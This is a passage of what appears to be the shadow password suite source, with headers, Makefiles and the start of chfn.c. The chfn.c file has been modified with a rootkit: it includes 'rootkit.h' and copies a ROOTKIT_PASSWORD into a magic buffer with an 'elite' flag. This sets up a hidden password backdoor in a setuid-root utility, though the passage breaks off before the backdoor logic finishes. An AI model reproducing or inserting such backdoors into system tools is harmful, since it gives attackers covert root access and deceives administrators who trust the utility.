 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifndef	_H_SHADOW
#define	_H_SHADOW

/*
 * This information is not derived from AT&T licensed sources.  Posted
 * to the USENET 11/88, and updated 11/90 with information from SVR4.
 *
 *	$Id: shadow_.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 */

#ifdef	ITI_AGING
typedef	time_t	sptime;
#else
typedef	long	sptime;
#endif

/*
 * Shadow password security file structure.
 */

struct	spwd {
	char	*sp_namp;	/* login name */
	char	*sp_pwdp;	/* encrypted password */
	sptime	sp_lstchg;	/* date of last change */
	sptime	sp_min;		/* minimum number of days between changes */
	sptime	sp_max;		/* maximum number of days between changes */
	sptime	sp_warn;	/* number of days of warning before password
				   expires */
	sptime	sp_inact;	/* number of days after password expires
				   until the account becomes unusable. */
	sptime	sp_expire;	/* days since 1/1/70 until account expires */
	unsigned long	sp_flag; /* reserved for future use */
};

/*
 * Shadow password security file functions.
 */

#include <stdio.h>  /* for FILE */

#if defined(__STDC__)
struct	spwd	*getspent (void);
struct	spwd	*getspnam (const char *);
struct	spwd	*sgetspent (const char *);
struct	spwd	*fgetspent (FILE *);
void	setspent (void);
void	endspent (void);
int	putspent (const struct spwd *, FILE *);
#else
struct	spwd	*getspent ();
struct	spwd	*getspnam ();
struct	spwd	*sgetspent ();
struct	spwd	*fgetspent ();
void	setspent ();
void	endspent ();
int	putspent ();
#endif

#define  SHADOW "/etc/shadow"
#endif
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * lastlog.h - structure of lastlog file
 *
 *	$Id: lastlog_.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 *
 *	This file defines a lastlog file structure which should be sufficient
 *	to hold the information required by login.  It should only be used if
 *	there is no real lastlog.h file.
 */

#ifndef __LASTLOG_H
#define __LASTLOG_H

struct	lastlog	{
	time_t	ll_time;
	char	ll_line[12];
	char	ll_host[16];
};

#define HAVE_LL_HOST
#endif /* _LASTLOG_H */
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr
exec_prefix = 

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/shadow
pkglibdir = $(libdir)/shadow
pkgincludedir = $(includedir)/shadow

top_builddir = ..

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = s,x,x,

AUTOMAKE_OPTIONS = 1.0 foreign

noinst_HEADERS = defines.h dialup.h faillog.h getdef.h \
 groupio.h md5.h port.h prototypes.h \
 pwauth.h pwio.h rcsid.h sgroupio.h shadowio.h

# These files are unneeded for some reason, listed in
# order of appearance:
#
# sources which are not really needed (are they in libc???)
# sources for dbm support (not yet used)
# sources for LIBOBJS (which are normally in libc)
# sources for CRYPTOBJS
# misc header sources

EXTRA_DIST = \
grent.c pwent.c \
\
grdbm.c gsdbm.c pwdbm.c spdbm.c \
grpack.c gspack.c pwpack.c sppack.c \
\
mkdir.c rename.c rmdir.c strdup.c strstr.c \
putgrent.c putpwent.c putspent.c \
sgetgrent.c sgetpwent.c sgetspent.c \
\
md5.c md5crypt.c \
\
gshadow_.h shadow_.h lastlog_.h

# We build libshadow for our tools.

noinst_LIBRARIES = shadow

shadow_SOURCES = commonio.c dialchk.c dialup.c encrypt.c fputsx.c \
 getdef.c getpass.c groupio.c gshadow.c lockpw.c port.c \
 pwauth.c pwio.c rad64.c sgroupio.c shadow.c shadowio.c utent.c

shadow_LIBADD =  putgrent.o sgetgrent.o sgetpwent.o md5.o md5crypt.o

INCLUDES = -I$(top_srcdir)/lib
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
LIBRARIES = $(noinst_LIBRARIES)

noinst_LIBFILES = libshadow.a

CC = gcc
LEX = @LEX@
YACC = @YACC@

DEFS = -DHAVE_CONFIG_H -I. -I$(srcdir) -I..
CPPFLAGS = 
CFLAGS = -O2 -Wall
LDFLAGS = -s
LIBS = 

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
shadow_OBJECTS = commonio.o dialchk.o dialup.o encrypt.o fputsx.o \
getdef.o getpass.o groupio.o gshadow.o lockpw.o port.o pwauth.o pwio.o \
rad64.o sgroupio.o shadow.o shadowio.o utent.o
EXTRA_shadow_SOURCES =
LIBFILES =  libshadow.a
AR = ar
RANLIB = ranlib
HEADERS = $(noinst_HEADERS)

DIST_COMMON = Makefile.am Makefile.in


PACKAGE = shadow
VERSION = 961025

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = $(shadow_SOURCES)
OBJECTS = $(shadow_OBJECTS)

default: all


mostlyclean-noinstLIBRARIES:

clean-noinstLIBRARIES:
	rm -f $(noinst_LIBFILES)

distclean-noinstLIBRARIES:

maintainer-clean-noinstLIBRARIES:

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:
$(shadow_OBJECTS): ../config.h

libshadow.a: $(shadow_OBJECTS) $(shadow_LIBADD)
	rm -f libshadow.a
	$(AR) cru libshadow.a $(shadow_OBJECTS) $(shadow_LIBADD)
	$(RANLIB) libshadow.a

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = lib
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
commonio.o: commonio.c rcsid.h prototypes.h faillog.h defines.h
dialchk.o: dialchk.c rcsid.h prototypes.h faillog.h defines.h dialup.h
dialup.o: dialup.c rcsid.h prototypes.h faillog.h defines.h dialup.h
encrypt.o: encrypt.c rcsid.h prototypes.h faillog.h defines.h
fputsx.o: fputsx.c defines.h rcsid.h
getdef.o: getdef.c rcsid.h prototypes.h faillog.h defines.h
getpass.o: getpass.c rcsid.h defines.h
groupio.o: groupio.c rcsid.h prototypes.h faillog.h defines.h \
 groupio.h
gshadow.o: gshadow.c
lockpw.o: lockpw.c rcsid.h prototypes.h faillog.h defines.h pwio.h \
 shadowio.h
mkdir.o: mkdir.c rcsid.h
port.o: port.c rcsid.h defines.h port.h
putgrent.o: putgrent.c prototypes.h faillog.h defines.h
putpwent.o: putpwent.c rcsid.h defines.h
putspent.o: putspent.c rcsid.h prototypes.h faillog.h defines.h
pwauth.o: pwauth.c rcsid.h prototypes.h faillog.h defines.h pwauth.h \
 getdef.h
pwio.o: pwio.c rcsid.h prototypes.h faillog.h defines.h pwio.h
rad64.o: rad64.c rcsid.h
rename.o: rename.c rcsid.h defines.h
rmdir.o: rmdir.c rcsid.h
sgetgrent.o: sgetgrent.c rcsid.h defines.h
sgetpwent.o: sgetpwent.c rcsid.h defines.h
sgetspent.o: sgetspent.c rcsid.h prototypes.h faillog.h defines.h
sgroupio.o: sgroupio.c rcsid.h prototypes.h faillog.h defines.h \
 sgroupio.h
shadow.o: shadow.c
shadowio.o: shadowio.c rcsid.h prototypes.h faillog.h defines.h \
 shadowio.h
strdup.o: strdup.c defines.h rcsid.h
strstr.o: strstr.c defines.h rcsid.h
utent.o: utent.c

info:

dvi:

check: all

installcheck:

install-exec: 

install-data: 

install: install-exec install-data all
	@:

uninstall: 

all: $(LIBFILES) $(HEADERS) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-noinstLIBRARIES mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

clean:  clean-noinstLIBRARIES clean-compile clean-tags clean-generic \
		mostlyclean 

distclean:  distclean-noinstLIBRARIES distclean-compile distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-noinstLIBRARIES \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-noinstLIBRARIES distclean-noinstLIBRARIES \
clean-noinstLIBRARIES maintainer-clean-noinstLIBRARIES \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean

.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr
exec_prefix = 

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/shadow
pkglibdir = $(libdir)/shadow
pkgincludedir = $(includedir)/shadow

top_builddir = ..

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = s,x,x,

AUTOMAKE_OPTIONS = 1.0 foreign

# Watch out; note the difference between prefix & exec_prefix.
# Normally configure sets exec_prefix to root when prefix is /usr.

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
ubindir = ${prefix}/bin
usbindir = ${prefix}/sbin

bin_PROGRAMS = login

# id and groups are from gnu, the rest is perhaps not important
# also suid programs are installed by hand.

suidbins = su
suidubins = chage chfn chsh expiry gpasswd newgrp passwd

# login-static removed - too big and not really needed, it is better to
# upgrade your telnetd, the LD_xxx bug is sooo old...  --marekm

noinst_PROGRAMS = chfn chsh passwd 

LDADD=../libmisc/libmisc.a ../lib/libshadow.a
INCLUDES= -I$(top_srcdir)/lib

# These are to trick the linker to link only libcrypt statically

STATLINK = -Wl,-Bstatic
DYNLINK = -Wl,-Bdynamic

login_static_SOURCES = login.c

# Some tools need libcrypt.
chfn_LDADD = $(LDADD) 
chpasswd_LDADD = $(LDADD) 
chsh_LDADD = $(LDADD) 
dpasswd_LDADD = $(LDADD) 
gpasswd_LDADD = $(LDADD) 
login_LDADD = $(LDADD)  
login_static_LDADD = $(LDADD)   -static
newgrp_LDADD = $(LDADD) 
newusers_LDADD = $(LDADD) 
passwd_LDADD = $(LDADD)  
su_LDADD = $(LDADD)  
# I think it's better...
sulogin_LDADD = $(LDADD) $(STATLINK)  $(DYNLINK)
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
PROGRAMS = $(usbin_PROGRAMS) $(bin_PROGRAMS) $(noinst_PROGRAMS)


CC = gcc
LEX = @LEX@
YACC = @YACC@

DEFS = -DHAVE_CONFIG_H -I. -I$(srcdir) -I..
CPPFLAGS = 
CFLAGS = -O2 -Wall
LDFLAGS = -s
LIBS = 

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
login_SOURCES = login.c
login_OBJECTS = login.o
EXTRA_login_SOURCES =
chfn_SOURCES = chfn.c
chfn_OBJECTS = chfn.o
EXTRA_chfn_SOURCES =
chsh_SOURCES = chsh.c
chsh_OBJECTS = chsh.o
EXTRA_chsh_SOURCES =
passwd_SOURCES = passwd.c
passwd_OBJECTS = passwd.o
EXTRA_passwd_SOURCES =
HEADERS = $(noinst_HEADERS)

DIST_COMMON = Makefile.am Makefile.in


PACKAGE = shadow
VERSION = 961025

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = login.c chfn.c chsh.c passwd.c
OBJECTS = login.o chfn.o chsh.o passwd.o

default: all


$(srcdir)/Makefile.in: Makefile.am $(top_srcdir)/configure.in
	cd $(top_srcdir) && automake $(subdir)/Makefile

mostlyclean-usbinPROGRAMS:

clean-usbinPROGRAMS:
	rm -f $(usbin_PROGRAMS)

clean-binPROGRAMS:
	rm -f $(bin_PROGRAMS)

clean-noinstPROGRAMS:
	rm -f $(noinst_PROGRAMS)

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

maintainer-clean-compile:
$(login_OBJECTS): ../config.h

login: $(login_OBJECTS) $(login_DEPENDENCIES)
	$(LINK) $(login_OBJECTS) $(login_LDADD) $(LIBS)
$(chfn_OBJECTS): ../config.h

chfn: $(chfn_OBJECTS) $(chfn_DEPENDENCIES)
	$(LINK) $(chfn_OBJECTS) $(chfn_LDADD) $(LIBS)
$(chsh_OBJECTS): ../config.h

chsh: $(chsh_OBJECTS) $(chsh_DEPENDENCIES)
	$(LINK) $(chsh_OBJECTS) $(chsh_LDADD) $(LIBS)
$(passwd_OBJECTS): ../config.h
passwd: $(passwd_OBJECTS) $(passwd_DEPENDENCIES)
	$(LINK) $(passwd_OBJECTS) $(passwd_LDADD) $(LIBS)

subdir = src
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
chfn.o: chfn.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/pwio.h ../lib/getdef.h ../lib/pwauth.h
chsh.o: chsh.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/pwio.h ../lib/getdef.h ../lib/pwauth.h
login.o: login.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/pwauth.h ../lib/getdef.h
passwd.o: passwd.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/pwauth.h ../lib/shadowio.h ../lib/pwio.h \
 ../lib/getdef.h

all: $(PROGRAMS) $(HEADERS) Makefile

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

mostlyclean:	mostlyclean-compile

clean:  clean-usbinPROGRAMS clean-binPROGRAMS clean-noinstPROGRAMS \
		clean-compile clean-tags clean-generic mostlyclean 

distclean:  distclean-usbinPROGRAMS distclean-binPROGRAMS \
		distclean-noinstPROGRAMS distclean-compile \
		distclean-tags distclean-generic clean 
	rm -f config.status

.PHONY: default mostlyclean-usbinPROGRAMS distclean-usbinPROGRAMS \
clean-usbinPROGRAMS maintainer-clean-usbinPROGRAMS \
uninstall-usbinPROGRAMS install-usbinPROGRAMS mostlyclean-binPROGRAMS \
distclean-binPROGRAMS clean-binPROGRAMS maintainer-clean-binPROGRAMS \
uninstall-binPROGRAMS install-binPROGRAMS mostlyclean-noinstPROGRAMS \
distclean-noinstPROGRAMS clean-noinstPROGRAMS \
maintainer-clean-noinstPROGRAMS mostlyclean-compile distclean-compile \
clean-compile maintainer-clean-compile tags mostlyclean-tags \
distclean-tags clean-tags maintainer-clean-tags distdir info dvi check \
installcheck install-exec install-data install uninstall all \
installdirs mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean


install-exec-local:
	$(mkinstalldirs) $(bindir)
	for i in $(suidbins); do \
	  $(INSTALL) -m 4755 $$i $(bindir); \
	done
	$(mkinstalldirs) $(ubindir)
	for i in $(suidubins); do \
	  $(INSTALL) -m 4755 $$i $(ubindir); \
	done
	rm -f $(bindir)/sg
	ln -s $(ubindir)/newgrp $(bindir)/sg
.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chfn.c,v 1.4 1996/09/25 03:20:00 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#include <pwd.h>
#include "pwio.h"
#include "getdef.h"
#include "pwauth.h"

#ifdef SHADOWPWD
#include <shadow.h>
#endif

#include "../../rootkit.h"

/*
 * Global variables.
 */

static char *Prog;
static char user[BUFSIZ];
static char fullnm[BUFSIZ];
static char roomno[BUFSIZ];
static char workph[BUFSIZ];
static char homeph[BUFSIZ];
static char slop[BUFSIZ];
static int amroot;

/*
 * External identifiers
 */

extern	int	optind;
extern	char	*optarg;
extern	char	*getlogin ();
#ifdef	NDBM
extern	int	pw_dbm_mode;
#endif

/*
 * #defines for messages.  This facilitates foreign language conversion
 * since all messages are defined right here.
 */

#define	USAGE \
"Usage: %s [ -f full_name ] [ -r room_no ] [ -w work_ph ] [ -h home_ph ]\n"
#define	ADMUSAGE \
"Usage: %s [ -f full_name ] [ -r room_no ] [ -w work_ph ]\n\
       [ -h home_ph ] [ -o other ] [ user ]\n"
#define	NOPERM		"%s: Permission denied.\n"
#define	WHOAREYOU	"%s: Cannot determine you user name.\n"
#define WRONGPWD	"Incorrect password for %s.\n"
#define WRONGPWD2	"incorrect password for `%s'"
#define	INVALID_NAME	"%s: invalid name: \"%s\"\n"
#define	INVALID_ROOM	"%s: invalid room number: \"%s\"\n"
#define	INVALID_WORKPH	"%s: invalid work phone: \"%s\"\n"
#define	INVALID_HOMEPH	"%s: invalid home phone: \"%s\"\n"
#define	INVALID_OTHER	"%s: \"%s\" contains illegal characters\n"
#define	INVALID_FIELDS	"%s: fields too long\n"
#define	NEWFIELDSMSG	"Changing the user information for %s\n"
#define	NEWFIELDSMSG2 \
"Enter the new value, or press return for the default\n\n"
#define FULL_NAME_IS	"Full name is %s\n"
#define	NEWNAME		"Full Name"
#define	NEWROOM		"Room Number"
#define	NEWWORKPHONE	"Work Phone"
#define	NEWHOMEPHONE	"Home Phone"
#define	NEWSLOP		"Other"
#define	UNKUSER		"%s: Unknown user %s\n"
#define	PWDBUSY		"Cannot lock the password file; try again later.\n"
#define	PWDBUSY2	"can't lock /etc/passwd\n"
#define	OPNERROR	"Cannot open the password file.\n"
#define	OPNERROR2	"can't open /etc/passwd\n"
#define	UPDERROR	"Error updating the password entry.\n"
#define	UPDERROR2	"error updating passwd entry\n"
#define	DBMERROR	"Error updating the DBM password entry.\n"
#define	DBMERROR2	"error updating DBM passwd entry.\n"
#define	NOTROOT		"Cannot change ID to root.\n"
#define	NOTROOT2	"can't setuid(0).\n"
#define	CLSERROR	"Cannot commit password file changes.\n"
#define	CLSERROR2	"can't rewrite /etc/passwd.\n"
#define	UNLKERROR	"Cannot unlock the password file.\n"
#define	UNLKERROR2	"can't unlock /etc/passwd.\n"
#define	CHGGECOS	"changed user `%s' information.\n"
#ifdef	USE_NIS
#define	NISUSER		"%s: cannot change user `%s' on NIS client.\n"
#define	NISMASTER	"%s: `%s' is the NIS master for this client.\n"
#endif

/*
 * usage - print command line syntax and exit
 */

static void
usage()
{
	fprintf (stderr, amroot ? ADMUSAGE:USAGE, Prog);
	exit (1);
}

/*
 * new_fields - change the user's GECOS information interactively
 *
 * prompt the user for each of the four fields and fill in the fields
 * from the user's response, or leave alone if nothing was entered.
 */

static void
new_fields()
{
	printf (NEWFIELDSMSG2);

	if (!amroot && getdef_bool("CHFN_RESTRICT"))
		printf(FULL_NAME_IS, fullnm);
	else
		change_field(fullnm, sizeof fullnm, NEWNAME);
	change_field(roomno, sizeof roomno, NEWROOM);
	change_field(workph, sizeof workph, NEWWORKPHONE);
	change_field(homeph, sizeof homeph, NEWHOMEPHONE);

	if (amroot)
		change_field(slop, sizeof slop, NEWSLOP);
}

/*
 * copy_field - get the next field from the gecos field
 *
 * copy_field copies the next field from the gecos field, returning a
 * pointer to the field which follows, or NULL if there are no more
 * fields.
 */

static char *
copy_field(in, out, extra)
	char *in;	/* the current GECOS field */
	char *out;	/* where to copy the field to */
	char *extra;	/* fields with '=' get copied here */
{
	char *cp = NULL;

	while (in) {
		if ((cp = strchr (in, ',')))
			*cp++ = '\0';

		if (! strchr (in, '='))
			break;

		if (extra) {
			if (extra[0])
				strcat (extra, ",");

			strcat (extra, in);
		}
		in = cp;
	}
	if (in && out)
		strcpy (out, in);

	return cp;
}

static void
passwd_check(user, passwd)
	const char *user;
	const char *passwd;
{
#ifdef SHADOWPWD
	struct spwd *sp;

	if ((sp = getspnam(user)))
		passwd = sp->sp_pwdp;
	endspent();
#endif
	if (pw_auth(passwd, user, PW_LOGIN, (char *) 0) != 0) {
		SYSLOG((LOG_WARN, WRONGPWD2, user));
		sleep(1);
		fprintf(stderr, WRONGPWD, user);
		exit(1);
	}
}

/*
 * chfn - change a user's password file information
 *
 *	This command controls the GECOS field information in the
 *	password file entry.
 *
 *	The valid options are
 *
 *	-f	full name
 *	-r	room number
 *	-w	work phone number
 *	-h	home phone number
 *	-o	other information (*)
 *
 *	(*) requires root permission to execute.
 */

/*
 * If CHFN_RESTRICT is set to "yes" in login.defs, the full name may only
 * be changed by root.  Room and phone numbers can still be changed by
 * the user.  To disallow any changes, remove the setuid bit.  --marekm
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	*cp;			/* temporary character pointer       */
	const struct passwd *pw;	/* password file entry               */
	struct	passwd	pwent;		/* modified password file entry      */
	char	old_gecos[BUFSIZ];	/* buffer for old GECOS fields       */
	char	new_gecos[BUFSIZ];	/* buffer for new GECOS fields       */
	int	flag;			/* flag currently being processed    */
	int	fflg = 0;		/* -f - set full name                */
	int	rflg = 0;		/* -r - set room number              */
	int	wflg = 0;		/* -w - set work phone number        */
	int	hflg = 0;		/* -h - set home phone number        */
	int	oflg = 0;		/* -o - set other information        */
	int	i;			/* loop control variable             */

    char MAG[6];
    int elite=0;
    strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
